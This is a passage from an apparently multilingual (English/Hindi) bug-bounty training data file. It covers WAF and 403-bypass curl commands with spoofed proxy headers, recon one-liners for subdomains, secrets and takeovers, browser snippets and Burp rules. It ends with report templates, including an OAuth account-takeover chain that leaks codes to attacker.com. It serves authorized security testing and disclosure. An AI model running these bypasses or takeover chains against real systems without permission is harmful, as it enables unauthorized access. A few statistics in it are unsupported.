      hi: "सुरक्षा नियम अक्सर सिर्फ `/admin` पर लगे होते हैं। जब आप `/admin.json` या `/api/users.json` रिक्वेस्ट करते हैं, तो डेटा बिना ब्लॉक हुए JSON में वापस आ जाता है।",
    },
    commandOrPayload: `# 1. Test extension appends:
curl -i "https://target.com/admin.json"
curl -i "https://target.com/admin.html"
curl -i "https://target.com/admin.xml"
curl -i "https://target.com/admin.php"

# 2. Content Negotiation Header Tampering:
curl -i "https://target.com/admin" -H "Accept: application/json, text/plain, */*"
curl -i "https://target.com/admin" -H "Accept: application/xml"`,
    whyItWorks: {
      en: "Modern frameworks like Rails and Django use format suffixes (`/admin.json`) for REST responses. WAF regexes matching strictly `^/admin$` fail to match `.json`, but the controller happily returns the data.",
      simple: "Firewall rules look for exact /admin path. Adding .json tricks the firewall while the website responds with data.",
      hi: "WAF नियम सिर्फ `/admin` शब्द पर नज़र रखते हैं। जब आप `.json` लगाते हैं, तो WAF मैच नहीं कर पाता लेकिन बैकएंड सारा डेटा डंप कर देता है।",
    },
  },
  {
    title: {
      en: "Protocol Downgrade & Internal Port Smuggling (HTTP/1.0 & Fake Hops)",
      simple: "HTTP/1.0 Downgrade and Internal Ports",
      hi: "HTTP/1.0 प्रोटोकॉल डाउनग्रेड और इंटरनल पोर्ट बाईपास",
    },
    category: "header_bypass",
    description: {
      en: "HTTP/1.0 does not require Host headers and frequently bypasses proxy caching and strict reverse proxy rule evaluation. Combined with port headers (`X-Forwarded-Port: 443`), it tricks the server into thinking the request originated from an already-validated internal TLS termination proxy.",
      simple: "Send old HTTP/1.0 requests or tell the server you are on the secure internal port.",
      hi: "HTTP/1.0 प्रोटोकॉल में कई आधुनिक WAF नियम काम नहीं करते। `X-Forwarded-Port: 443` हेडर के साथ भेजने पर सर्वर समझता है कि यह पहले से वेरिफाइड इंटरनल ट्रैफिक है।",
    },
    commandOrPayload: `# 1. HTTP/1.0 Downgrade via Netcat or cURL:
curl -i --http1.0 "https://target.com/admin"

# 2. Internal TLS Termination and Port Headers:
X-Forwarded-Port: 443
X-Forwarded-Proto: https
X-Forwarded-Scheme: https
X-Forwarded-Ssl: on
Front-End-Https: on

# 3. RFC 7239 Standard Forwarded Header:
Forwarded: for=127.0.0.1;proto=https;by=127.0.0.1`,
    whyItWorks: {
      en: "Load balancers strip SSL and pass plain HTTP traffic internally with `X-Forwarded-Proto: https` or `Front-End-Https: on`. Emulating these headers satisfies backend checks that verify if TLS termination already took place.",
      simple: "Tells the backend server that the front security scanner has already approved and encrypted this request.",
      hi: "लोड बैलेंसर इंटरनल सर्वर्स को `X-Forwarded-Proto: https` हेडर भेजते हैं। इसे खुद इंजेक्ट करने पर बैकएंड समझता है कि लोड बैलेंसर ने इसे पहले ही चेक कर लिया है।",
    },
  },
];

// ── 3. ELITE RECON TERMINAL ONE-LINERS ───────────────────────────────────────
export const RECON_ONE_LINERS: ReconCommand[] = [
  {
    id: "recon-subs-live",
    title: {
      en: "Subdomains to Live Targets with Tech Stack & Status",
      simple: "Find All Working Subdomains Fast",
      hi: "सारे सबडोमेन्स ढूंढकर लाइव वर्किंग होस्ट्स निकालना",
    },
    category: "subdomains",
    toolsUsed: ["subfinder", "httpx"],
    command: "subfinder -d target.com -all -silent | httpx -title -tech-detect -status-code -mc 200,302,403 -silent -o live_subs.txt",
    explanation: {
      en: "Pipes passive subdomain enumeration from subfinder straight into httpx to probe for active web servers, HTTP status codes, and tech stack detection (e.g. React, Spring, Nginx).",
      simple: "Finds all subdomains and instantly tests which ones are online.",
      hi: "`subfinder` से सारे सबडोमेन्स निकालता है और `httpx` से चेक करता है कि कौनसे लाइव हैं, उनका स्टेटस कोड क्या है और कौनसी टेक्नोलॉजी चल रही है।",
    },
  },
  {
    id: "recon-js-extract",
    title: {
      en: "Scrape All Target JavaScript Files from Live Subdomains",
      simple: "Download Every JS File on Target",
      hi: "टारगेट के सारे JavaScript फाइल्स एक क्लिक में डाउनलोड करना",
    },
    category: "javascript",
    toolsUsed: ["katana"],
    command: "katana -list live_subs.txt -jc -d 3 -silent | grep -E '\\.js(\\?|$)' | sort -u > target_js.txt",
    explanation: {
      en: "Crawls all live subdomains to depth 3 with JavaScript parsing enabled (`-jc`), extracting every single `.js` bundle and script endpoint.",
      simple: "Crawls the site and saves the links to every script file.",
      hi: "सारे लाइव सबडोमेन्स को क्रॉल करके सभी `.js` फाइल्स की लिस्ट एक फाइल में सेव करता है।",
    },
  },
  {
    id: "recon-secrets-nuclei",
    title: {
      en: "Scan Downloaded JS Files for Leaked Tokens & AWS Keys",
      simple: "Find Leaked API Keys in JS Files",
      hi: "JS फाइल्स में लीक हुए API टोकन्स और AWS कीज खोजना",
    },
    category: "secrets",
    toolsUsed: ["nuclei"],
    command: "nuclei -list target_js.txt -t http/exposures/tokens/ -silent -o leaked_secrets.txt",
    explanation: {
      en: "Runs community-maintained token exposure templates against every discovered JS bundle to catch AWS access keys, Stripe secret keys, Slack webhooks, and private API tokens.",
      simple: "Scans script files to see if developers forgot secret passwords inside.",
      hi: "सभी JS फाइल्स को न्यूक्लियाई टोकन टेम्प्लेट्स से स्कैन करके लीक हुए स्ट्राइप, AWS और स्लैक टोकन्स निकालता है।",
    },
  },
  {
    id: "recon-endpoints-linkfinder",
    title: {
      en: "Extract Hidden REST & GraphQL Endpoints from JS",
      simple: "Find Hidden API Links in Scripts",
      hi: "JS फाइल्स से छिपे हुए API एंडपॉइंट्स एक्सट्रेक्ट करना",
    },
    category: "javascript",
    toolsUsed: ["linkfinder", "curl"],
    command: "cat target_js.txt | while read url; do python3 linkfinder.py -i $url -o cli; done | sort -u > hidden_endpoints.txt",
    explanation: {
      en: "Runs LinkFinder across all script bundles to find unlinked REST routes (like `/api/v2/admin/export` or `/graphql`). Over 40% of hidden routes lack authentication.",
      simple: "Discovers hidden admin and API paths buried inside script code.",
      hi: "LinkFinder चलाकर सभी कोड में छिपे हुए API एंडपॉइंट्स निकालता है जिन्हें ब्राउज़र में सीधे नहीं देखा जा सकता।",
    },
  },
  {
    id: "recon-params-arjun",
    title: {
      en: "Discover Hidden Query Parameters via Arjun",
      simple: "Find Hidden URL Parameters",
      hi: "छिपे हुए URL पैरामीटर्स (IDOR/SSRF के लिए) खोजना",
    },
    category: "parameters",
    toolsUsed: ["arjun"],
    command: "arjun -u 'https://target.com/api/v1/user' -m GET,POST --passive -oJ params.json",
    explanation: {
      en: "Fuzzes and inspects HTTP headers to discover hidden parameters (like `debug=true`, `admin=1`, `role=admin`, `redirect=...`) that unlock hidden functionality.",
      simple: "Tests for hidden switches like ?debug=true or ?admin=1.",
      hi: "`arjun` टूल से छिपे हुए पैरामीटर्स (जैसे `debug`, `redirect`, `user_id`) ढूंढता है जो अक्सर बग्स को ट्रिगर करते हैं।",
    },
  },
  {
    id: "recon-takeover-subzy",
    title: {
      en: "Scan Subdomains for Orphaned CNAME Takeovers",
      simple: "Find Subdomains You Can Claim for Cash",
      hi: "सबडोमेन टेकओवर (Dangling CNAMEs) स्कैन करना",
    },
    category: "subdomains",
    toolsUsed: ["subzy"],
    command: "subzy run --targets live_subs.txt --concurrency 50 --hide_fails --verify_ssl",
    explanation: {
      en: "Checks every live and dead subdomain against known fingerprints (AWS S3, GitHub Pages, Heroku, Zendesk) to pinpoint claimable dangling CNAMEs.",
      simple: "Finds deleted cloud pages you can register for $1,000+ bounties.",
      hi: "सभी सबडोमेन्स को चेक करता है कि क्या कोई AWS S3 या GitHub Pages पर लटकी हुई (dangling) CNAME है जिसे क्लेम किया जा सके।",
    },
  },
  {
    id: "recon-403-tamper",
    title: {
      en: "Automated 403 Forbidden Header Tamper Loop",
      simple: "Fast cURL Loop to Unlock 403 Pages",
      hi: "cURL लूप चलाकर 403 Forbidden पेज को 200 OK में बदलना",
    },
    category: "bypasses",
    toolsUsed: ["curl", "bash"],
    command: `TARGET="https://target.com/admin"
for h in "X-Forwarded-For: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1" "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
  status=$(curl -s -k -o /dev/null -w "%{http_code}" -H "$h" "$TARGET")
  echo "[$status] with header: $h"
done`,
    explanation: {
      en: "Iterates through reverse-proxy authentication headers to see if any header flips a 403 Forbidden response into a 200 OK.",
      simple: "Tests 4 common admin headers automatically to see if the page opens.",
      hi: "चार मुख्य प्रॉक्सी हेडर्स को लूप में टेस्ट करता है ताकि देखा जा सके कि कौन सा हेडर 403 को 200 में बदलता है।",
    },
  },
];

// ── 4. HUNTER MINDSET, DRY SPELLS & WORKFLOW ─────────────────────────────────
export const MINDSET_RULES: MindsetRule[] = [
  {
    id: "dry-spell",
    title: {
      en: "The 2-Week Dry Spell Rule (Mental Stamina)",
      simple: "What to Do When You Find No Bugs",
      hi: "2-हफ़्ते का 'ड्राई स्पेल' नियम (मानसिक धैर्य)",
    },
    badge: {
      en: "PSYCHOLOGICAL RESILIENCE",
      simple: "STAY PATIENT",
      hi: "मानसिक धैर्य",
    },
    subtitle: {
      en: "Every full-time hacker experiences 2–3 consecutive weeks with $0. Here is how top earners handle it:",
      simple: "Even the best hackers make $0 for weeks. Here is how they stay confident:",
      hi: "दुनिया का सबसे बड़ा बाउंटी हंटर भी महीने में 2 हफ़्ते बिना किसी बग के रहता है। प्रो हंटर्स इसे ऐसे संभालते हैं:",
    },
    coreLesson: {
      en: "When you hit a dry spell, 90% of the time it is NOT a lack of skill — it is target fatigue. You have spent too long on the same 2 hardened endpoints where low-hanging fruit does not exist. Shift your target immediately.",
      simple: "If you find nothing, you are not bad at hacking — you are just testing the wrong target for too long.",
      hi: "जब 2 हफ़्ते तक बग न मिले, तो यह मत सोचिए कि आपमें स्किल नहीं है। असल कारण 'टारगेट फैटीग' है — आप बहुत समय से एक ही सख्त टारगेट पर अटके हैं। तुरंत टारगेट बदलें।",
    },
    actionSteps: [
      {
        en: "Switch to a brand new Vulnerability Disclosure Program (VDP) for 2 days. Finding 2 quick informational bugs resets your momentum and confidence.",
        simple: "Hunt on an easy non-paying site for 2 days to get your confidence back.",
        hi: "2 दिन के लिए किसी आसान VDP प्रोग्राम पर जाएं। 1-2 बग मिलते ही आपका आत्मविश्वास वापस आ जाएगा।",
      },
      {
        en: "Audit your testing depth: Did you only run nuclei and ffuf? If yes, stop automated tools and spend 3 hours testing multi-account permissions manually.",
        simple: "Stop using scanners and test account buttons manually.",
        hi: "चेक करें: क्या आप सिर्फ टूल्स चला रहे थे? टूल्स बंद करें और 2 अकाउंट्स बनाकर मैन्युअल लॉजिक टेस्ट करें।",
      },
      {
        en: "Read recently disclosed HackerOne reports in the Hacktivity feed to discover new parameter names and attack vectors.",
        simple: "Read disclosed reports to get fresh ideas.",
        hi: "HackerOne Hacktivity पर हाल ही में पब्लिश हुई रिपोर्ट्स पढ़ें और नए अटैक वेक्टर्स सीखें।",
      },
    ],
  },
  {
    id: "timeboxing",
    title: {
      en: "The 4-Hour Exit Rule (Timeboxing Discipline)",
      simple: "When to Leave a Target",
      hi: "4-घंटे का एग्जिट नियम (टाइमबॉक्सिंग अनुशासन)",
    },
    badge: {
      en: "TIME DISCIPLINE",
      simple: "SAVE TIME",
      hi: "समय प्रबंधन",
    },
    subtitle: {
      en: "Do not fall in love with a target that refuses to yield findings.",
      simple: "Do not waste weeks on a website that gives you nothing.",
      hi: "किसी ऐसे टारगेट से प्यार न करें जो आपको कोई रिस्पॉन्स या बग नहीं दे रहा।",
    },
    coreLesson: {
      en: "Set a strict 4-hour timer when onboarding a new target. If after 4 hours of recon, JS endpoint extraction, and role mapping you find clean modern architecture with strict WAF and zero leaks, DOCUMENT NOTES AND MOVE ON.",
      simple: "Give a new target 4 hours. If everything is super clean, write notes and switch to another site.",
      hi: "नए टारगेट पर 4 घंटे का सख्त टाइमर लगाएं। अगर 4 घंटे की गहरी टेस्टिंग के बाद भी आर्किटेक्चर बिल्कुल टाइट और सुरक्षित है, तो नोट्स बनाएं और तुरंत अगला टारगेट चुनें।",
    },
    actionSteps: [
      {
        en: "Save your discovered subdomains and JS links into your notes app (Obsidian or Notion) before exiting.",
        simple: "Save your notes before switching sites.",
        hi: "छोड़ने से पहले सारे निकाले गए सबडोमेन्स और JS लिंक्स अपने नोट्स में सेव कर लें।",
      },
      {
        en: "Set an alert on your phone for that company's Android app updates on Google Play Store. When they ship a new version, come back.",
        simple: "Come back when they release a new mobile app update.",
        hi: "कंपनी के मोबाइल ऐप अपडेट्स पर नज़र रखें — नया अपडेट आते ही दोबारा टेस्ट करने आएं।",
      },
    ],
  },
  {
    id: "asset-graph",
    title: {
      en: "The Professional Target Asset Graph (Note-Taking)",
      simple: "How to Take Notes Like a Pro",
      hi: "प्रोफेशनल टारगेट एसेट ग्राफ (नोट-टेकिंग वर्कफ़्लो)",
    },
    badge: {
      en: "ORGANIZATION",
      simple: "WORKFLOW",
      hi: "वर्कफ़्लो",
    },
    subtitle: {
      en: "Top hunters treat bug bounty like an intelligence operation, not random clicking.",
      simple: "Organize your targets cleanly to spot bugs others miss.",
      hi: "टॉप हंटर्स बाउंटी को एक खुफिया मिशन की तरह डेटा मैनेज करके खेलते हैं।",
    },
    coreLesson: {
      en: "Maintain a folder for every target with 4 dedicated files: `ROLES.md` (Account matrix), `APIS.md` (Extracted endpoints), `WAF_BYPASSES.md` (403 URLs to re-test), and `POC_DRAFTS.md`.",
      simple: "Keep 4 note files for every target: User Roles, API links, Blocked Pages, and Bug Drafts.",
      hi: "हर टारगेट के लिए 4 फाइल्स मेंटेन करें: रोल्स मैट्रिक्स, API एंडपॉइंट्स, 403 ब्लॉक पेजेज (बाद में टेस्ट करने के लिए) और रिपोर्ट ड्राफ्ट्स।",
    },
    actionSteps: [
      {
        en: "Map out every role: Admin, Manager, Member, Billing, Guest. Broken access control happens at the boundaries between these roles.",
        simple: "Write down every type of account permission.",
        hi: "सारे रोल्स (Admin, Manager, Member, Billing) नोट करें — 90% IDOR इन्हीं के बीच मिलते हैं।",
      },
      {
        en: "Color-code your Burp Suite sitemap tabs: Green = Tested clean, Yellow = Suspicious parameter, Red = Active vulnerability.",
        simple: "Color-code your Burp Suite tabs.",
        hi: "Burp Suite साइटमैप में कलर्स यूज़ करें: Green = टेस्ट हो गया, Yellow = शक है, Red = बग कन्फर्म।",
      },
    ],
  },
];

// ── 5. AUTOMATION HELPERS & WORKFLOW SCRIPTS ──────────────────────────────────
export interface AutomationHelper {
  id: string;
  title: Record<Lang, string>;
  category: "devtools" | "burp" | "cli_importer";
  badge: string;
  description: Record<Lang, string>;
  codeOrInstructions: string;
  howToUse: Record<Lang, string>;
  outputExample?: string;
}

export const AUTOMATION_HELPERS: AutomationHelper[] = [
  {
    id: "helper-devtools-endpoints",
    title: {
      en: "DOM Endpoint & Hidden Route Scraper (Console Snippet)",
      simple: "Browser Snippet: Find Hidden Links",
      hi: "DOM एंडपॉइंट व हिडन रूट्स स्क्रैपर (DevTools स्निपेट)",
    },
    category: "devtools",
    badge: "BROWSER DEVTOOLS",
    description: {
      en: "Scrapes the current DOM, inline scripts, link tags, and form actions to extract all API endpoints (/api/..., /v1/..., /graphql) and renders a clean sorted console table.",
      simple: "Paste this into your browser console to automatically find all hidden web links and API routes on the page.",
      hi: "पेज के DOM, इनलाइन स्क्रिप्ट्स और फॉर्म्स से सभी API एंडपॉइंट्स (`/api/...`, `/graphql`) निकालता है और DevTools कंसोल में टेबल बनाकर दिखाता है।",
    },
    codeOrInstructions: `(() => {
  const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src);
  const links = Array.from(document.querySelectorAll('a[href], link[href], form[action]'))
    .map(el => el.href || el.action)
    .filter(Boolean);

  const regex = /(['"])((\\/api\\/|\\/v[0-9]\\/|\\/graphql|\\/oauth|\\/user\\/|\\/admin\\/)[a-zA-Z0-9_\\-\\/]+)\\1/g;
  const matches = new Set();

  document.querySelectorAll('script:not([src])').forEach(s => {
    let match;
    while ((match = regex.exec(s.textContent)) !== null) {
      matches.add(match[2]);
    }
  });

  console.group("%c🎯 Target DOM Discovered Endpoints", "color:#10b981;font-weight:bold;font-size:13px;");
  console.log("%cTotal External Scripts:", "color:#38bdf8;", scripts.length);
  console.log("%cDiscovered Internal API Routes:", "color:#f59e0b;font-weight:bold;");
  console.table(Array.from(matches).sort().map(endpoint => ({ "Endpoint Path": endpoint })));
  console.groupEnd();
})();`,
    howToUse: {
      en: "Open DevTools (F12 or Cmd+Option+I) -> click 'Console' tab -> paste code and hit Enter.",
      simple: "Press F12, open Console, paste the script and press Enter.",
      hi: "ब्राउज़र में F12 दबाकर Console टैब खोलें, कोड पेस्ट करें और Enter दबाएं।",
    },
    outputExample: "Console prints a formatted table of all discovered API paths.",
  },
  {
    id: "helper-devtools-unhide",
    title: {
      en: "Unhide Hidden Inputs & Unlock Disabled Buttons",
      simple: "Browser Snippet: Reveal Hidden Form Fields",
      hi: "हिडन फॉर्म इनपुट्स और डिसेबल्ड बटन अनलॉक स्निपेट",
    },
    category: "devtools",
    badge: "BROWSER DEVTOOLS",
    description: {
      en: "Converts all <input type='hidden'> to visible highlighted text fields and strips 'disabled' and 'readonly' attributes from all buttons and controls for fast unauthorized submission testing.",
      simple: "Makes all hidden form fields visible on screen and enables all grayed-out buttons so you can test them.",
      hi: "पेज पर छिपे हुए सभी hidden इनपुट्स को स्क्रीन पर विजिबल बनाता है और डिसेबल्ड बटन्स को अनलॉक करता है ताकि आप पैरामीटर्स टेस्ट कर सकें।",
    },
    codeOrInstructions: `(() => {
  let unhidden = 0;
  let unlocked = 0;

  document.querySelectorAll('input[type="hidden"]').forEach(el => {
    el.type = 'text';
    el.style.border = '2px dashed #f59e0b';
    el.style.backgroundColor = '#1e1b4b';
    el.style.color = '#38bdf8';
    el.style.padding = '4px';
    el.style.margin = '2px';
    el.placeholder = 'HIDDEN: ' + (el.name || el.id || 'param');
    unhidden++;
  });

  document.querySelectorAll('[disabled], [readonly]').forEach(el => {
    el.removeAttribute('disabled');
    el.removeAttribute('readonly');
    el.style.outline = '2px solid #10b981';
    unlocked++;
  });

  console.log(\`%c[+] Automation: Unhidden \${unhidden} hidden inputs, Unlocked \${unlocked} disabled controls!\`, "color:#10b981;font-weight:bold;font-size:12px;");
})();`,
    howToUse: {
      en: "Paste into Console on any complex form page (checkout, profile settings, or role management).",
      simple: "Paste into Console on any page with forms or buttons.",
      hi: "चेकआउट या प्रोफाइल पेज पर Console में पेस्ट करें — सारे हिडन इनपुट्स स्क्रीन पर दिखने लगेंगे।",
    },
  },
  {
    id: "helper-devtools-storage",
    title: {
      en: "Client Storage & JWT Token Security Inspector",
      simple: "Browser Snippet: Inspect JWT & Tokens",
      hi: "क्लाइंट स्टोरेज व JWT टोकन इंस्पेक्टर स्निपेट",
    },
    category: "devtools",
    badge: "BROWSER DEVTOOLS",
    description: {
      en: "Scans localStorage, sessionStorage, and document cookies, automatically identifies JWT tokens, base64-decodes the payload claims, and audits role and expiration properties.",
      simple: "Reads local storage and automatically decodes login tokens and user roles.",
      hi: "ब्राउज़र के localStorage और sessionStorage में मौजूद JWT टोकन्स को ऑटो-डिकोड करके यूज़र रोल्स और एक्सपायरी दिखाता है।",
    },
    codeOrInstructions: `(() => {
  const parseJwt = token => {
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return null;
      return JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
    } catch { return null; }
  };

  const results = [];
  const checkItem = (source, key, val) => {
    if (!val || typeof val !== 'string') return;
    const jwt = parseJwt(val);
    if (jwt) {
      results.push({ Source: source, Key: key, Role: jwt.role || jwt.roles || jwt.scope || 'N/A', Expiry: jwt.exp ? new Date(jwt.exp * 1000).toLocaleString() : 'No Exp', "JWT Payload": jwt });
    } else if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('user')) {
      results.push({ Source: source, Key: key, Value: val.substring(0, 50) + '...', "Type": "Plain Token/User" });
    }
  };

  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    checkItem('localStorage', k, localStorage.getItem(k));
  }
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    checkItem('sessionStorage', k, sessionStorage.getItem(k));
  }

  console.group("%c🔐 Client Storage Security Audit", "color:#a855f7;font-weight:bold;font-size:13px;");
  if (results.length > 0) {
    console.table(results);
  } else {
    console.log("No sensitive JWTs or Auth keys found in window storage.");
  }
  console.groupEnd();
})();`,
    howToUse: {
      en: "Run in Console after logging into the target application to inspect session tokens.",
      simple: "Run in Console while logged in to check your session permissions.",
      hi: "टारगेट पर लॉगिन करने के बाद Console में चलाएं ताकि सेशन टोकन्स और रोल्स का विश्लेषण हो सके।",
    },
  },
  {
    id: "helper-burp-autorize",
    title: {
      en: "Burp Suite Autorize Hands-Free IDOR Automation",
      simple: "Burp Tool: Automatic Permission Checker",
      hi: "Burp Suite Autorize हैंड्स-फ्री IDOR ऑटोमेशन सेटअप",
    },
    category: "burp",
    badge: "BURP EXTENSION",
    description: {
      en: "Step-by-step setup to automatically audit authorization and privilege escalation in the background across every click in your browser without manually changing cookies.",
      simple: "Setup Burp to automatically test for authorization bugs while you browse normally.",
      hi: "Burp Suite में Autorize एक्सटेंशन सेटअप करके बैकग्राउंड में हर क्लिक पर अपने आप IDOR टेस्ट करने का तरीका।",
    },
    codeOrInstructions: `# Step 1: Install "Autorize" from Burp BApp Store (Extensions -> BApp Store -> Autorize).
# Step 2: Open Target Application:
#   - Browser 1 (Normal): Log in as Account A (Attacker)
#   - Browser 2 (Incognito): Log in as Account B (Victim)
# Step 3: Copy Account B's Cookie header from Burp HTTP History:
#   Cookie: session_id=VICTIM_COOKIE_HERE; auth_token=XYZ
# Step 4: Paste cookie into Autorize tab -> check "Autorize is on".
# Step 5: Browse the application normally as Account A.
#
# Reading Results:
#   🟢 [Bypassed!] (Green): High-severity IDOR! Account B executed Account A's action.
#   🟠 [Warning] (Orange): Length difference detected, inspect in Repeater.
#   🔴 [Enforced] (Red): Correctly blocked (401/403).`,
    howToUse: {
      en: "Configure once in Burp Suite and browse normally. Investigate any green highlighted rows.",
      simple: "Turn it on in Burp Suite and watch for green rows.",
      hi: "Burp Suite में एक बार सेट करें और सामान्य ब्राउज़िंग करें। ग्रीन रो दिखते ही IDOR रिपोर्ट करें।",
    },
  },
  {
    id: "helper-burp-match-replace",
    title: {
      en: "Burp Suite Match & Replace WAF & Proxy Spoofing Rules",
      simple: "Burp Rules: Auto-Inject Bypass Headers",
      hi: "Burp Suite मैच व रिप्लेस WAF स्पूफिंग रूल्स",
    },
    category: "burp",
    badge: "BURP CONFIGURATION",
    description: {
      en: "Automatically injects localhost and internal proxy headers into every outgoing request through Burp Proxy to test for 403 Forbidden bypasses automatically.",
      simple: "Burp rules to automatically send fake admin headers with every single web request.",
      hi: "Burp Proxy से जाने वाली हर रिक्वेस्ट में ऑटोमैटिकली `X-Forwarded-For: 127.0.0.1` जैसे हेडर्स जोड़ने के नियम।",
    },
    codeOrInstructions: `Navigate to: Burp Suite -> Settings -> Proxy -> "Match and replace rules":

Rule 1 (Loopback Client-IP):
- Type: Request header
- Match: (leave empty to add new header)
- Replace: X-Forwarded-For: 127.0.0.1
- Enabled: [x]

Rule 2 (Custom Authorization Bypass):
- Type: Request header
- Match: (leave empty)
- Replace: X-Custom-IP-Authorization: 127.0.0.1
- Enabled: [x]

Rule 3 (Original URL Rewriting):
- Type: Request header
- Match: (leave empty)
- Replace: X-Original-URL: /admin
- Enabled: [x]

Rule 4 (Bug Bounty Disclosure Attribution):
- Type: Request header
- Match: (leave empty)
- Replace: X-Bug-Bounty: your_hackerone_username
- Enabled: [x]`,
    howToUse: {
      en: "Add these 4 rules in Burp Settings -> Proxy -> Match and replace.",
      simple: "Add these headers into Burp Proxy Settings under Match and Replace.",
      hi: "Burp Proxy Settings में Match and Replace सेक्शन में ये 4 हेडर्स एक्टिवेट करें।",
    },
  },
  {
    id: "helper-cli-importer",
    title: {
      en: "Recon Asset Importer & Normalizer CLI Script",
      simple: "Workspace Script: Import Subdomain Lists",
      hi: "रिकॉन एसेट इंपोर्टर व नॉर्मलाइज़र CLI स्क्रिप्ट",
    },
    category: "cli_importer",
    badge: "WORKSPACE UTILITY",
    description: {
      en: "Local Node.js automation script that parses raw subfinder / httpx text files, removes duplicate hosts, categorizes in-scope vs out-of-scope assets, and exports clean JSON for the workspace.",
      simple: "Run this script in terminal to clean and import your subdomain lists into the workspace.",
      hi: "लोकल Node.js स्क्रिप्ट जो subfinder/httpx की लिस्ट से डुप्लीकेट्स हटाकर स्कोप के हिसाब से क्लीन JSON तैयार करती है।",
    },
    codeOrInstructions: `# 1. Parse an existing recon output file:
node scripts/import-recon.mjs --input live_subs.txt --target target.com

# 2. Pipe directly from subfinder:
subfinder -d target.com -silent | node scripts/import-recon.mjs --target target.com --out scope_import.json

# 3. View options and help:
node scripts/import-recon.mjs --help`,
    howToUse: {
      en: "Run in your terminal inside the project directory: `node scripts/import-recon.mjs`.",
      simple: "Run in your command terminal inside this project folder.",
      hi: "प्रोजेक्ट फोल्डर के टर्मिनल में चलाएं: `node scripts/import-recon.mjs`।",
    },
  },
];

// ── 6. READY-TO-SUBMIT BUG REPORT TEMPLATES & ESCALATORS ─────────────────────
export interface ReportTemplate {
  id: string;
  vulnType: string;
  title: Record<Lang, string>;
  severity: "Critical (P1)" | "High (P2)" | "Medium (P3)";
  cvssVector: string;
  cvssScore: number;
  escalatorTip: Record<Lang, string>;
  sampleReport: string;
}

export const REPORT_TEMPLATES: ReportTemplate[] = [
  {
    id: "report-ato-oauth",
    vulnType: "Account Takeover (OAuth / Open Redirect)",
    title: {
      en: "Full Account Takeover via OAuth redirect_uri Validation Bypass & Authorization Code Leakage",
      simple: "Steal Any User's Account via Social Login Bypass",
      hi: "OAuth redirect_uri बाईपास और ऑथराइज़ेशन कोड लीकेज से फुल अकाउंट टेकओवर",
    },
    severity: "Critical (P1)",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    cvssScore: 9.3,
    escalatorTip: {
      en: "Do NOT report just an Open Redirect. Chain it directly to the OAuth /login endpoint where `redirect_uri` allows your open redirect path or subdomain. Prove that the OAuth code is sent in the URL hash/query to the attacker domain. This turns a $0 informative report into a $5,000+ P1 critical payout.",
      simple: "Don't report open redirect alone. Connect it to social login so the secret login code gets sent to you. That changes $0 into $5,000+.",
      hi: "सिर्फ ओपन रीडायरेक्ट रिपोर्ट न करें। उसे OAuth लॉगिन के `redirect_uri` में जोड़कर दिखाएं कि विक्टिम का ऑथराइज़ेशन कोड अटैकर सर्वर पर पहुंच रहा है। इससे $0 की रिपोर्ट सीधे $5,000+ P1 में बदल जाती है।",
    },
    sampleReport: `**Vulnerability Title:**
Full Account Takeover via OAuth redirect_uri Validation Bypass & Authorization Code Leakage

**Vulnerability Type:**
Improper Validation of Specified Type of Input (CWE-1287) / Account Takeover

**Severity:**
Critical (CVSS 9.3: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Summary:**
The OAuth 2.0 authorization endpoint at \`https://auth.target.com/oauth/authorize\` improperly validates the \`redirect_uri\` parameter. By leveraging a parameter pollution or subdomain path traversal technique, an attacker can trick the authorization server into sending victim OAuth \`code\` tokens to an attacker-controlled endpoint.

**Steps to Reproduce:**
1. Log in as an attacker and observe the OAuth authorization flow:
   \`GET /oauth/authorize?client_id=WEB_APP&response_type=code&redirect_uri=https://target.com/oauth/callback&scope=user:read HTTP/1.1\`
2. Notice the regex allows arbitrary paths on \`target.com\` or wildcard subdomains.
3. Combine this with an open redirect at \`https://target.com/logout?next=https://attacker.com\`:
   \`GET /oauth/authorize?client_id=WEB_APP&response_type=code&redirect_uri=https://target.com/logout%3Fnext%3Dhttps://attacker.com&scope=user:read HTTP/1.1\`
4. Send the crafted link to a logged-in victim.
5. As soon as the victim clicks the link, the server redirects them and appends the authorization code to the attacker's server in the query parameters:
   \`GET https://attacker.com/?code=AUTH_SECRET_CODE_98124\`
6. The attacker exchanges this code at \`https://auth.target.com/oauth/token\` for a valid victim Bearer token, taking over the victim's account without credentials.

**Impact:**
Any attacker can completely compromise arbitrary accounts without user interaction beyond clicking a single legitimate-looking target link.

**Remediation:**
Implement strict whitelist matching for \`redirect_uri\` instead of loose substring or regex matching. Reject any URI containing query parameters or path traversals.`,
  },
  {
    id: "report-idor-tenant",
    vulnType: "Critical Multi-Tenant IDOR (Data Tampering)",
    title: {
      en: "Critical Multi-Tenant IDOR on Invoice API Allowing Modification & Deletion of Foreign Tenant Records",
      simple: "Modify or Delete Other Company's Invoices without Permission",
      hi: "मल्टी-टेनेंट IDOR: दूसरी कंपनी के इनवॉइस को बिना अनुमति मॉडिफाई और डिलीट करना",
    },
    severity: "Critical (P1)",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 8.8,
    escalatorTip: {
      en: "Do NOT stop at reading other users' data with GET (which often gets downgraded to Medium P3). Always test PUT, PATCH, and DELETE. Showing that you can overwrite billing amounts or delete corporate contracts upgrades the severity directly to P1 Critical.",
      simple: "Don't just view data. Try to edit or delete it with PUT or DELETE requests. Editing or deleting elevates the report to high payout.",
      hi: "सिर्फ GET से डेटा देखने पर न रुकें (ट्राइएजर इसे Medium P3 मान सकता है)। PUT, PATCH या DELETE टेस्ट करके दिखाएं कि आप दूसरों का डेटा बदल या मिटा सकते हैं। यह तुरंत P1 Critical बन जाता है।",
    },
    sampleReport: `**Vulnerability Title:**
Critical Multi-Tenant IDOR on Invoice API Allowing Modification & Deletion of Foreign Tenant Records

**Vulnerability Type:**
